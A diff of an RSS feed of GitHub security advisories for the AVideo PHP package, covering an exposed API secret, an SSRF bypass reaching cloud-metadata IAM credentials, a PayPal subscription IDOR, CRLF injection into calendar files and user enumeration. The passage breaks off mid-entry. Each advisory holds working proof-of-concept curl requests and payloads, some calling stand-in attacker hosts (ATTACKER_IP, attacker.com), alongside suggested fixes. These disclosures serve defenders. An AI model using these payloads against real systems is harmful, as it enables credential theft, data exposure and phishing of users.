@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/composer.rss</id>
     <title>Security Advisory for PHP packages hosted at packagist.org</title>
-    <updated>2026-05-05T21:38:53.461Z</updated>
+    <updated>2026-05-05T22:34:59.897Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer"/>
     <subtitle>Security Advisory for PHP packages hosted at packagist.org on GitHub</subtitle>
@@ -11,6 +11,881 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[wwbn/avideo] AVideo Vulnerable to Exposure of Sensitive Information to an Unauthorized Actor and Missing Authorization]]></title>
+        <id>https://github.com/advisories/GHSA-xr49-f4rh-qcjf</id>
+        <link href="https://github.com/advisories/GHSA-xr49-f4rh-qcjf"/>
+        <updated>2026-05-05T22:20:43.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>  An unauthenticated user can read <code>APISecret</code> from <code>objects/plugins.json.php</code> and use it to call protected API endpoints
+  (e.g. <code>users_list</code>) without logging in.</p>
+<h3 id="details">Details</h3>
+<p>  <code>objects/plugins.json.php</code> is public and still exposes plugin <code>object_data</code> containing <code>APISecret</code>.
+  That secret is accepted by <code>plugin/API/get.json.php</code> as authentication.</p>
+<h3 id="poc">PoC</h3>
+<ol>
+<li>Get plugin config (contains <code>APISecret</code>):</li>
+</ol>
+<pre><code class="language-bash">curl 'http://&lt;host&gt;/objects/plugins.json.php'
+</code></pre>
+<img src="https://github.com/user-attachments/assets/027073fc-dccd-4e1d-8450-ad12345e88eb" alt="image" height="94" width="879">
+
+<ol start="2">
+<li>Copy APISecret from response, then call API directly:</li>
+</ol>
+<pre><code class="language-bash">curl --get 'http://&lt;host&gt;/plugin/API/get.json.php' \
+  --data-urlencode 'APIName=users_list' \
+  --data-urlencode 'APISecret=&lt;APISecret&gt;' \
+  --data-urlencode 'rowCount=3' \
+  --data-urlencode 'current=1'
+</code></pre>
+<img src="https://github.com/user-attachments/assets/edd629be-e75c-40a2-a52f-2f2e6da99b79" alt="image" height="170" width="1719">
+
+
+<h3 id="impact">Impact</h3>
+<p>  Unauthenticated disclosure of sensitive config (APISecret) leading to unauthorized access to protected API data.</p>
+<h3 id="recommended-fix">Recommended fix</h3>
+<p>  Requiring admin auth for full plugin inventory/config endpoint.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/WWBN/AVideo/security/advisories/GHSA-xr49-f4rh-qcjf">https://github.com/WWBN/AVideo/security/advisories/GHSA-xr49-f4rh-qcjf</a></li>
+<li><a href="https://github.com/WWBN/AVideo/commit/1c36f229d0a103528fb9f64d0a1cc0e1e8f5999b">https://github.com/WWBN/AVideo/commit/1c36f229d0a103528fb9f64d0a1cc0e1e8f5999b</a></li>
+<li><a href="https://github.com/advisories/GHSA-xr49-f4rh-qcjf">https://github.com/advisories/GHSA-xr49-f4rh-qcjf</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-xr49-f4rh-qcjf</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-05T22:20:42.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[wwbn/avideo] AVideo has SSRF Protection Bypass via HTTP Redirect and DNS Rebinding in isSSRFSafeURL()]]></title>
+        <id>https://github.com/advisories/GHSA-2hch-c97c-g99x</id>
+        <link href="https://github.com/advisories/GHSA-2hch-c97c-g99x"/>
+        <updated>2026-05-05T22:16:34.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Two endpoints in AVideo call <code>isSSRFSafeURL()</code> to validate user-supplied URLs, then fetch them using bare <code>file_get_contents()</code> <strong>without disabling PHP's automatic redirect following</strong>. An attacker can supply a URL pointing to a server they control that returns a 302 redirect to an internal/cloud-metadata address (e.g., <code>http://169.254.169.254/latest/meta-data/</code>). Since <code>isSSRFSafeURL()</code> only validates the <em>initial</em> URL, the redirect target bypasses all SSRF protections.</p>
+<p>A secondary finding is that 6+ callers of <code>isSSRFSafeURL()</code> discard the <code>$resolvedIP</code> out-parameter meant for DNS pinning, leaving them vulnerable to DNS rebinding TOCTOU attacks.</p>
+<p><strong>Severity:</strong> High — CVSS 3.1: 7.7 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N)</p>
+<h3 id="details">Details</h3>
+<h4 id="finding-1-redirect-based-ssrf-bypass">Finding 1: Redirect-Based SSRF Bypass</h4>
+<p><strong>Vulnerable code — <code>plugin/AI/receiveAsync.json.php</code> (line ~162–165):</strong></p>
+<pre><code class="language-php">// SSRF Protection: Validate URL before fetching
+if (!isSSRFSafeURL($imageUrl)) {
+    // blocked
+} else {
+    $imageContent = file_get_contents($imageUrl);  // ← FOLLOWS REDIRECTS!
+}
+</code></pre>
+<p><strong>Vulnerable code — <code>objects/EpgParser.php</code> (line ~358–362):</strong></p>
+<pre><code class="language-php">if (!isSSRFSafeURL($this-&gt;url)) {
+    throw new \RuntimeException('URL blocked by SSRF protection');
+}
+$this-&gt;content = @file_get_contents($this-&gt;url);  // ← FOLLOWS REDIRECTS!
+</code></pre>
+<p><strong>Safe code for comparison — <code>objects/functions.php</code>, <code>url_get_contents()</code>:</strong></p>
+<pre><code class="language-php">$opts = ['http' =&gt; ['follow_location' =&gt; 0]];  // Disable auto-redirect
+$context = stream_context_create($opts);
+for ($redirectCount = 0; $redirectCount &lt;= 5; $redirectCount++) {
+    $fetched = file_get_contents($currentUrl, false, $context);
+    // ... parse Location header ...
+    if ($redirectTarget) {
+        if (!isSSRFSafeURL($redirectTarget)) {  // Re-validates EACH hop
+            return false;
+        }
+        $currentUrl = $redirectTarget;
+        continue;
+    }
+    $tmp = $fetched;
+    break;
+}
+</code></pre>
+<p><strong>Root cause:</strong> The SSRF redirect protection (<code>follow_location=0</code> + manual redirect loop with per-hop <code>isSSRFSafeURL()</code> re-validation) was correctly implemented in <code>url_get_contents()</code> but NOT propagated to these two endpoints that call <code>file_get_contents()</code> directly. PHP's default <code>follow_location</code> is <code>1</code> (follow redirects).</p>
+<h4 id="finding-2-dns-rebinding-toctou-multiple-callers">Finding 2: DNS Rebinding TOCTOU (Multiple Callers)</h4>
+<p><code>isSSRFSafeURL()</code> provides a <code>$resolvedIP</code> out-parameter for DNS pinning via <code>CURLOPT_RESOLVE</code>. Only 1 of 9 callers (<code>plugin/LiveLinks/proxy.php</code>) uses it. The remaining 8 callers discard it and pass the original hostname to the fetching function, which resolves DNS independently — creating a TOCTOU race window exploitable via DNS rebinding (TTL=0).</p>
+<p><strong>Affected callers (no DNS pinning):</strong></p>
+<ul>
+<li><code>objects/aVideoEncoderReceiveImage.json.php</code> — 4 call sites</li>
+<li><code>objects/aVideoEncoder.json.php</code> — 1 call site</li>
+<li><code>plugin/BulkEmbed/save.json.php</code> — 1 call site</li>
+<li><code>plugin/AI/receiveAsync.json.php</code> — 1 call site</li>
+<li><code>objects/EpgParser.php</code> — 1 call site</li>
+<li><code>plugin/Scheduler/Scheduler.php</code> — 1 call site</li>
+</ul>
+<h3 id="poc">PoC</h3>
+<h4 id="redirect-bypass-poc">Redirect Bypass PoC</h4>
+<ol>
+<li>Attacker runs an HTTP server that returns a 302 redirect:</li>
+</ol>
+<pre><code class="language-python">from http.server import HTTPServer, BaseHTTPRequestHandler
+
+class RedirectHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(302)
+        self.send_header("Location", "http://169.254.169.254/latest/meta-data/iam/security-credentials/")
+        self.end_headers()
+
+HTTPServer(("0.0.0.0", 8888), RedirectHandler).serve_forever()
+</code></pre>
+<ol start="2">
+<li>Attacker triggers AI image generation and intercepts the callback:</li>
+</ol>
+<pre><code>POST /plugin/AI/receiveAsync.json.php
+Content-Type: application/x-www-form-urlencoded
+
+type=image&amp;token=VALID_TOKEN&amp;ai_responses_id=ID&amp;response[data][0][url]=http://ATTACKER_IP:8888/redir
+</code></pre>
+<ol start="3">
+<li><code>isSSRFSafeURL("http://ATTACKER_IP:8888/redir")</code> resolves attacker IP → public → <strong>passes</strong></li>
+<li><code>file_get_contents("http://ATTACKER_IP:8888/redir")</code> follows 302 to <code>http://169.254.169.254/...</code> — <strong>no SSRF re-check occurs</strong></li>
+<li>Cloud metadata (including IAM credentials) is saved as a video thumbnail, retrievable by the attacker</li>
+</ol>
+<p><strong>Control test:</strong> Replace the redirect target with a legitimate public URL — <code>isSSRFSafeURL()</code> passes and the content is fetched normally, confirming the function works for non-malicious URLs.</p>
+<h4 id="dns-rebinding-poc">DNS Rebinding PoC</h4>
+<ol>
+<li>Configure a domain with TTL=0 DNS that alternates:<ul>
+<li>First query: public IP (passes <code>isSSRFSafeURL</code>)</li>
+<li>Second query: <code>127.0.0.1</code> (reaches internal services)</li>
+</ul>
+</li>
+<li>Submit <code>http://rebind.attacker.com/image.jpg</code> to any affected endpoint</li>
+<li><code>isSSRFSafeURL()</code> resolves → public IP → passes (discards <code>$resolvedIP</code>)</li>
+<li><code>url_get_contents()</code> / <code>file_get_contents()</code> resolves again → <code>127.0.0.1</code> → SSRF achieved</li>
+</ol>
+<h3 id="impact">Impact</h3>
+<p>An authenticated attacker can force the AVideo server to make HTTP requests to arbitrary internal hosts, including:</p>
+<ul>
+<li><strong>Cloud metadata endpoints</strong> (169.254.169.254) — exfiltrate IAM credentials, instance identity</li>
+<li><strong>Internal services</strong> on localhost or private network (databases, admin panels, monitoring)</li>
+<li><strong>Port scanning</strong> of the internal network using the server as a proxy</li>
+</ul>
+<p>The exfiltrated data is stored as video thumbnails/images, making it retrievable through the application's public interface.</p>
+<h3 id="suggested-fix">Suggested Fix</h3>
+<p><strong>Fix 1 (Redirect bypass — immediate):</strong> Route both affected files through <code>url_get_contents()</code> which already handles redirects safely, or add explicit no-redirect context:</p>
+<pre><code class="language-php">$ctx = stream_context_create(['http' =&gt; ['follow_location' =&gt; 0]]);
+$imageContent = file_get_contents($imageUrl, false, $ctx);
+</code></pre>
+<p><strong>Fix 2 (DNS rebinding — defense-in-depth):</strong> Update all callers to capture <code>$resolvedIP</code> and pass it to a DNS-pinning-aware fetch function using <code>CURLOPT_RESOLVE</code>.</p>
+<h3 id="credit">Credit</h3>
+<p>Kai Aizen <a href="mailto:kai.aizen.dev@gmail.com">kai.aizen.dev@gmail.com</a></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/WWBN/AVideo/security/advisories/GHSA-2hch-c97c-g99x">https://github.com/WWBN/AVideo/security/advisories/GHSA-2hch-c97c-g99x</a></li>
+<li><a href="https://github.com/WWBN/AVideo/commit/603e7bf77a835584387327e35560262feb075db3">https://github.com/WWBN/AVideo/commit/603e7bf77a835584387327e35560262feb075db3</a></li>
+<li><a href="https://github.com/advisories/GHSA-2hch-c97c-g99x">https://github.com/advisories/GHSA-2hch-c97c-g99x</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-2hch-c97c-g99x</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-05T22:16:33.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[wwbn/avideo] AVideo: IDOR in PayPalYPT Plugin Allows Any Authenticated User to Cancel Arbitrary PayPal Subscription Agreements]]></title>
+        <id>https://github.com/advisories/GHSA-958h-qp3x-q4gj</id>
+        <link href="https://github.com/advisories/GHSA-958h-qp3x-q4gj"/>
+        <updated>2026-05-05T22:16:13.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p><code>plugin/PayPalYPT/agreementCancel.json.php</code> cancels a PayPal billing agreement using an attacker-supplied <code>agreement</code> parameter without verifying that the authenticated user owns the agreement. A low-privilege authenticated user who learns or obtains another user's PayPal billing agreement ID can silently suspend the victim's recurring subscription, causing revenue loss to the platform and loss of paid service to the victim.</p>
+<h2 id="details">Details</h2>
+<p>AVideo's PayPalYPT plugin ships two near-duplicate endpoints that cancel a PayPal billing agreement. Only one of them enforces ownership:</p>
+<ul>
+<li><p><code>plugin/PayPalYPT/PayPalAgreementCancel.json.php:19</code> — correctly requires either admin or the agreement's owner:</p>
+<pre><code class="language-php">if (!User::isAdmin() &amp;&amp; !Subscription::isAgreementFromUser($_POST['agreement_id'], User::getId())) {
+    $obj-&gt;msg = "Only the owner can delete his agreement";
+    die(json_encode($obj));
+}
+</code></pre>
+</li>
+<li><p><code>plugin/PayPalYPT/agreementCancel.json.php:9-26</code> — only checks <code>User::isLogged()</code> (in fact twice, redundantly) and then calls the cancellation directly:</p>
+<pre><code class="language-php">if (!User::isLogged()) { ... die; }              // line 9
+if (empty($_REQUEST['agreement'])) { ... die; }   // line 14
+if (!User::isLogged()) { ... die; }              // line 19 — duplicate; no ownership check
+$plugin = AVideoPlugin::loadPluginIfEnabled("PayPalYPT");
+$agreement = PayPalYPT::cancelAgreement($_REQUEST['agreement']);  // line 26
+</code></pre>
+</li>
+</ul>
+<p><code>PayPalYPT::cancelAgreement()</code> at <code>plugin/PayPalYPT/PayPalYPT.php:548-566</code> resolves the agreement ID against PayPal and calls <code>$createdAgreement-&gt;suspend($agreementStateDescriptor, $apiContext)</code> unconditionally — the server does not verify that the logged-in user's <code>users_id</code> matches the owner recorded in <code>PayPalYPT_log</code> (or wherever the agreement was registered):</p>
+<pre><code class="language-php">public static function cancelAgreement($agreement_id)
+{
+    ...
+    $createdAgreement = self::getBillingAgreement($agreement_id);
+    try {
+        $createdAgreement-&gt;suspend($agreementStateDescriptor, $apiContext);
+        return Agreement::get($createdAgreement-&gt;getId(), $apiContext);
+    } catch (Exception $ex) {
+        return false;
+    }
+}
+</code></pre>
+<p>The intended UI caller is <code>subscriptions_list.php:84</code> which posts the current user's own agreement IDs — but the server accepts any <code>agreement</code> parameter from any logged-in user. Agreement IDs can leak via <code>_error_log</code> entries written in <code>agreementCancel.json.php:34</code> and <code>webhook.php</code> during normal operation, via PayPal receipt emails, or via other administrative and payment-log screens. No CSRF token is required, but the root defect is missing authorization, not CSRF.</p>
+<h2 id="poc">PoC</h2>
+<ol>
+<li><p>Log in as any low-privilege user (registered subscriber, commenter, free-tier account created via <code>signUp</code>).</p>
+</li>
+<li><p>Obtain the target's PayPal agreement ID (e.g., <code>I-ABCD1234XYZ</code>). This may come from server error logs, email receipts, admin/payment screens, or other disclosures.</p>
+</li>
+<li><p>Send the request with the victim's agreement ID:</p>
+<pre><code class="language-bash">curl -X POST 'https://target.example/plugin/PayPalYPT/agreementCancel.json.php' \
+  -b 'PHPSESSID=&lt;attacker_session&gt;' \
+  -d 'agreement=I-ABCD1234XYZ'
+</code></pre>
+</li>
+<li><p>Expected response:</p>
+<pre><code class="language-json">{"error":false,"msg":""}
+</code></pre>
+<p>The victim's billing agreement is suspended at PayPal via <code>Agreement::suspend()</code> (PayPalYPT.php:560). The victim stops being billed; AVideo subsequently reflects the subscription as inactive.</p>
+</li>
+</ol>
+<h2 id="impact">Impact</h2>
+<ul>
+<li>Any authenticated user can silently cancel another user's active PayPal recurring billing agreement.</li>
+<li>Revenue disruption for the platform operator — any affected subscribers stop being billed.</li>
+<li>Service disruption for the victim — their paid subscription lapses.</li>
+<li>The defect is purely an authorization gap; the sister endpoint <code>PayPalAgreementCancel.json.php</code> demonstrates that the owner/admin check was intentional for this action but was not applied to this duplicate.</li>
+</ul>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<p>Port the ownership check from the sister endpoint into <code>agreementCancel.json.php</code>:</p>
+<pre><code class="language-php">if (!User::isAdmin() &amp;&amp; !Subscription::isAgreementFromUser($_REQUEST['agreement'], User::getId())) {
+    $obj-&gt;msg = "Only the owner can cancel this agreement";
+    die(json_encode($obj));
+}
+</code></pre>
+<p>Alternative, preferred remediation: delete the duplicate <code>agreementCancel.json.php</code> entirely and point the <code>cancelAgreement()</code> JS helper in <code>subscriptions_list.php:84</code> at the already-protected <code>PayPalAgreementCancel.json.php</code> endpoint (sending the expected <code>agreement_id</code> POST field). While patching, also remove the redundant second <code>User::isLogged()</code> branch at line 19.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/WWBN/AVideo/security/advisories/GHSA-958h-qp3x-q4gj">https://github.com/WWBN/AVideo/security/advisories/GHSA-958h-qp3x-q4gj</a></li>
+<li><a href="https://github.com/WWBN/AVideo/commit/0da3dcff1eda2f497694bf82b559829471c292c2">https://github.com/WWBN/AVideo/commit/0da3dcff1eda2f497694bf82b559829471c292c2</a></li>
+<li><a href="https://github.com/advisories/GHSA-958h-qp3x-q4gj">https://github.com/advisories/GHSA-958h-qp3x-q4gj</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-958h-qp3x-q4gj</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-05T22:16:12.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[wwbn/avideo] AVideo: Unauthenticated CRLF/ICS Injection in Scheduler downloadICS.php Allows Calendar Event Spoofing]]></title>
+        <id>https://github.com/advisories/GHSA-mwgh-92m2-wvhv</id>
+        <link href="https://github.com/advisories/GHSA-mwgh-92m2-wvhv"/>
+        <updated>2026-05-05T22:14:33.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The unauthenticated <code>plugin/Scheduler/downloadICS.php</code> endpoint passes attacker-controlled <code>title</code>, <code>description</code>, and <code>joinURL</code> parameters into <code>Scheduler::downloadICS()</code>, which builds an ICS calendar file via the <code>ICS</code> helper class. <code>ICS::escape_string()</code> (<code>objects/ICS.php:167-169</code>) only escapes <code>,</code> and <code>;</code> and does NOT neutralize CR/LF, so attacker CRLF bytes inside a property value break out and inject arbitrary ICS lines — including <code>END:VEVENT</code> / <code>BEGIN:VEVENT</code> pairs that add entire attacker-controlled calendar events. Because the malicious <code>.ics</code> file is served from the victim's trusted AVideo origin, this enables high-credibility calendar phishing: forged meetings with attacker-chosen <code>SUMMARY</code>, <code>URL</code>, <code>LOCATION</code>, and <code>DESCRIPTION</code> landing in the victim's calendar after import.</p>
+<h2 id="details">Details</h2>
+<h3 id="vulnerable-code-path">Vulnerable code path</h3>
+<p><strong><code>plugin/Scheduler/downloadICS.php</code></strong> — unauthenticated entry point:</p>
+<pre><code class="language-php">if(!AVideoPlugin::isEnabledByName('Scheduler')){
+    forbiddenPage('Scheduler is disabled');
+}
+if(empty($_REQUEST['title'])){ forbiddenPage('Title cannot be empty'); }
+if(empty($_REQUEST['date_start'])){ forbiddenPage('date_start cannot be empty'); }
+
+Scheduler::downloadICS($_REQUEST['title'], $_REQUEST['date_start'], @$_REQUEST['date_end'],
+    @$_REQUEST['reminder'], @$_REQUEST['joinURL'], @$_REQUEST['description']);
+</code></pre>
+<p>There is no session check, no CSRF token, no user-role check — only an empty-check on <code>title</code>/<code>date_start</code> and a plugin-enabled check.</p>
+<p><strong><code>plugin/Scheduler/Scheduler.php:367-382</code></strong> passes inputs directly to the ICS builder:</p>
+<pre><code class="language-php">$props = array(
+    'location' =&gt; $location,
+    'description' =&gt; $description,   // attacker-controlled
+    'dtstart' =&gt; $dtstart,
+    'dtend' =&gt; $dtend,
+    'summary' =&gt; $title,             // attacker-controlled
+    'url' =&gt; $joinURL,               // attacker-controlled
+    'valarm' =&gt; $VALARM,
+);
+$ics = new ICS($props);
+...
+echo $icsString;
+</code></pre>
+<p><strong><code>objects/ICS.php:167-169</code></strong> — incomplete escape:</p>
+<pre><code class="language-php">private function escape_string($str) {
+    return preg_replace('/([\,;])/','\\\$1', $str);
+}
+</code></pre>
+<p>Per RFC 5545 §3.3.11, TEXT values must also have CR/LF either folded or encoded as <code>\n</code>. This implementation does neither. <code>ICS::to_string()</code> (line 101) joins every property with <code>"\r\n"</code>, so any raw <code>\r\n</code> sequence embedded in a value breaks out of the property line and injects new ICS directives.</p>
+<h3 id="verified-exploit-output">Verified exploit output</h3>
+<p>Running the builder with a CRLF-laden <code>description</code> produces a file with two distinct <code>VEVENT</code> blocks (the second entirely attacker-controlled):</p>
+<pre><code>BEGIN:VCALENDAR
+VERSION:2.0
+PRODID:-//hacksw/handcal//NONSGML v1.0//EN
+CALSCALE:GREGORIAN
+BEGIN:VEVENT
+DESCRIPTION:Hello
+END:VEVENT
+BEGIN:VEVENT
+SUMMARY:Injected
+URL:http://attacker.com
+DTSTART:20260501T000000Z
+DTEND:20260501T130000Z
+SUMMARY:Legit
+URL;VALUE=URI:https://example.com
+DTSTAMP:20260424T082123Z
+UID:69eb2803d1aa2
+END:VEVENT
+END:VCALENDAR
+</code></pre>
+<p>The injected <code>BEGIN:VEVENT</code> / <code>END:VEVENT</code> pair is standards-compliant and parsed as an additional event by Outlook, Apple Calendar, Google Calendar, and Thunderbird/Lightning.</p>
+<h2 id="poc">PoC</h2>
+<ol>
+<li><p>Ensure the Scheduler plugin is enabled on the target (default-shipped optional plugin, commonly enabled on streaming deployments).</p>
+</li>
+<li><p>Send an unauthenticated GET request with CRLF-encoded payload in <code>description</code>:</p>
+</li>
+</ol>
+<pre><code>curl -o malicious.ics \
+  'http://victim.example.com/plugin/Scheduler/downloadICS.php?title=Team%20Standup&amp;date_start=2026-05-01+12:00&amp;description=Hello%0D%0AEND:VEVENT%0D%0ABEGIN:VEVENT%0D%0ASUMMARY:URGENT%3A%20Password%20Reset%20Required%0D%0ADTSTART:20260601T090000Z%0D%0ADTEND:20260601T100000Z%0D%0AURL:http://attacker.com/phish%0D%0ALOCATION:Online%0D%0ADESCRIPTION:Please%20click%20the%20URL%20to%20confirm%20your%20identity'
+</code></pre>
+<ol start="3">
+<li>The returned file contains two <code>VEVENT</code> blocks. Import into any standards-compliant calendar client — both events appear in the victim's calendar. The injected event renders with an attacker-chosen clickable URL.</li>
+</ol>
+<p>Local reproduction (without needing a running server) using the same code path:</p>
+<pre><code>php -r "require 'objects/ICS.php'; \$p = ['description' =&gt; \"Hello\r\nEND:VEVENT\r\nBEGIN:VEVENT\r\nSUMMARY:Injected\r\nURL:http://attacker.com\", 'dtstart'=&gt;'2026-05-01', 'dtend'=&gt;'2026-05-01 13:00', 'summary'=&gt;'Legit', 'url'=&gt;'https://example.com']; echo (new ICS(\$p))-&gt;to_string();"
+</code></pre>
+<p>Produces the two-VEVENT output shown above (verified).</p>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Same-origin calendar phishing.</strong> The <code>.ics</code> is served from the trusted AVideo domain, bypassing URL-reputation checks and email-filter suspicion of attacker-hosted attachments.</li>
+<li><strong>Arbitrary event spoofing.</strong> Attacker controls <code>SUMMARY</code>, <code>DTSTART</code>, <code>DTEND</code>, <code>URL</code>, <code>LOCATION</code>, <code>DESCRIPTION</code>, and may add further ICS properties (e.g. <code>ORGANIZER</code>, <code>ATTENDEE</code>). Many mainstream calendar clients display the <code>URL</code> field as a clickable link in the event body.</li>
+<li><strong>Integrity:</strong> Low — unwanted/forged events are added to the victim's calendar after they import the file.</li>
+<li><strong>Auth:</strong> None. Precondition is only that the Scheduler plugin is enabled, which is typical on deployments that use AVideo's scheduled streaming features.</li>
+<li><strong>Confidentiality / Availability:</strong> No direct impact.</li>
+</ul>
+<p>Not a higher-severity response-splitting bug: PHP's <code>header()</code> blocks CRLF in response headers since 5.1.2, so the CRLF bytes do not escape into HTTP headers — only into the ICS body.</p>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<p>Strip or RFC-5545-encode CR/LF in <code>ICS::escape_string()</code> so newline bytes cannot break out of a property line. In <code>objects/ICS.php:167-169</code>:</p>
+<pre><code class="language-php">private function escape_string($str) {
+    // RFC 5545 §3.3.11: escape backslash, semicolon, comma; encode newlines as \n
+    $str = str_replace(array("\\", "\r\n", "\r", "\n"), array("\\\\", "\\n", "\\n", "\\n"), $str);
+    return preg_replace('/([\,;])/', '\\\\$1', $str);
+}
+</code></pre>
+<p>Additionally, <code>plugin/Scheduler/downloadICS.php</code> should either require authentication or at minimum apply strict input validation (length caps, character whitelists) on <code>title</code>, <code>description</code>, and <code>joinURL</code> — and <code>joinURL</code> should continue to be validated via <code>isValidURL()</code> (already done) before emission. Consider adding a defence-in-depth strip of CR/LF on every <code>$_REQUEST</code> parameter used by <code>Scheduler::downloadICS()</code>.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/WWBN/AVideo/security/advisories/GHSA-mwgh-92m2-wvhv">https://github.com/WWBN/AVideo/security/advisories/GHSA-mwgh-92m2-wvhv</a></li>
+<li><a href="https://github.com/WWBN/AVideo/commit/764db592f99e545aa86bb9a4ad664ffd14c38ba5">https://github.com/WWBN/AVideo/commit/764db592f99e545aa86bb9a4ad664ffd14c38ba5</a></li>
+<li><a href="https://github.com/advisories/GHSA-mwgh-92m2-wvhv">https://github.com/advisories/GHSA-mwgh-92m2-wvhv</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-mwgh-92m2-wvhv</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-05T22:14:31.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[wwbn/avideo] AVideo: Unauthenticated User Enumeration in objects/users.json.php via isCompany Parameter Allows Bypass of the Admin-Only Listing Restriction]]></title>
+        <id>https://github.com/advisories/GHSA-6rvw-7p8v-mjfq</id>
+        <link href="https://github.com/advisories/GHSA-6rvw-7p8v-mjfq"/>
+        <updated>2026-05-05T22:02:37.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p><code>objects/users.json.php</code> exposes two unauthenticated paths that disclose the full set of registered user accounts. The <code>isCompany</code> request parameter causes the handler to set <code>$ignoreAdmin = true</code> for any non-admin caller (including unauthenticated visitors), which defeats the admin-only guard inside <code>User::getAllUsers()</code>/<code>User::getTotalUsers()</code>. A second path accepts <code>users_id</code> and calls <code>User::getUserFromID()</code> directly with no permission check, producing a single-user oracle. Both paths return <code>id</code>, <code>identification</code> (display name), channel URL, <code>photo</code>, <code>background</code>, and <code>status</code>, plus the total account count.</p>
+<h2 id="details">Details</h2>
+<h3 id="root-cause-1--iscompany-admin-bypass">Root cause #1 — <code>isCompany</code> admin bypass</h3>
+<p><code>objects/users.json.php:13-53</code> (HEAD, v29.0):</p>
+<pre><code class="language-php">$canAdminUsers = canAdminUsers();                                    // line 13 — for output filtering only
+...
+if (!empty($_REQUEST['users_id'])) {
+    $user = User::getUserFromID($_REQUEST['users_id']);              // path #2
+    ...
+} else if (empty($_REQUEST['user_groups_id'])) {
+    $isAdmin     = null;
+    $isCompany   = null;
+    $ignoreAdmin = canSearchUsers() ? true : false;
+    ...
+    if (isset($_REQUEST['isCompany'])) {                              // line 39
+        $isCompany = intval($_REQUEST['isCompany']);
+        if (!$canAdminUsers) {
+            if (User::isACompany()) { $isCompany = 0; }
+            else                    { $isCompany = 1; }
+            $ignoreAdmin = true;                                      // line 47 — bypass flag
+        }
+    }
+    ...
+    $users = User::getAllUsers($ignoreAdmin, [...], @$_GET['status'], $isAdmin, $isCompany);
+    $total = User::getTotalUsers($ignoreAdmin, @$_GET['status'], $isAdmin, $isCompany);
+}
+</code></pre>
+<p><code>User::isACompany()</code> with no argument (<code>objects/user.php:1629-1646</code>) returns <code>!empty($_SESSION['user']['is_company'])</code>, which is <code>false</code> for unauthenticated visitors. So the anonymous-attacker branch takes the <code>else</code> arm: <code>$isCompany = 1; $ignoreAdmin = true;</code>.</p>
+<p>The admin-only guards in <code>User::getAllUsers()</code> (<code>objects/user.php:2315-2321</code>) and <code>User::getTotalUsers()</code> (<code>objects/user.php:2480-2484</code>) are now short-circuited:</p>
+<pre><code class="language-php">public static function getAllUsers($ignoreAdmin = false, ...) {
+    if (!Permissions::canAdminUsers() &amp;&amp; !$ignoreAdmin) {   // $ignoreAdmin === true → guard skipped
+        _error_log('You are not admin and cannot list all users');
+        return false;
+    }
+    ...
+    $sql = "SELECT * FROM users u WHERE 1=1 ...";
+    if (isset($isCompany)) {
+        if (!empty($isCompany) &amp;&amp; $isCompany == self::$is_company_status_ISACOMPANY || ...) {
+            $sql .= " AND is_company = $isCompany ";
+        } else {
+            $sql .= " AND (is_company = 0 OR is_company IS NULL) ";
+        }
+    }
+</code></pre>
+<p>Note: when the attacker supplies <code>isCompany=0</code>, the <code>else</code> branch is taken because of PHP's operator precedence (<code>!empty($isCompany) &amp;&amp; ...</code> short-circuits to false), and the SQL filter becomes <code>is_company = 0 OR is_company IS NULL</code> — i.e. <strong>every non-company user</strong>. Combined with the bypass, this returns the entire user table in chunks controlled by the attacker-supplied <code>rowCount</code>.</p>
+<h3 id="root-cause-2--users_id-single-record-oracle">Root cause #2 — <code>users_id</code> single-record oracle</h3>
+<p><code>objects/users.json.php:20-29</code> calls <code>User::getUserFromID($_REQUEST['users_id'])</code> with no auth check. <code>User::getUserFromID()</code> (<code>objects/user.php:2028-2075</code>) queries <code>SELECT * FROM users WHERE id = ?</code> and returns <code>id</code>, <code>identification</code>, <code>photo</code>, <code>background</code>, <code>status</code>, <code>channelName</code>, <code>about</code>, <code>tags</code>, with only <code>password</code>/<code>recoverPass</code>/PII stripped for non-admins. The handler then wraps this in the standard BootGrid envelope with <code>total = 1</code> when the user exists and <code>total = 0</code> otherwise — a perfect sequential-ID existence oracle.</p>
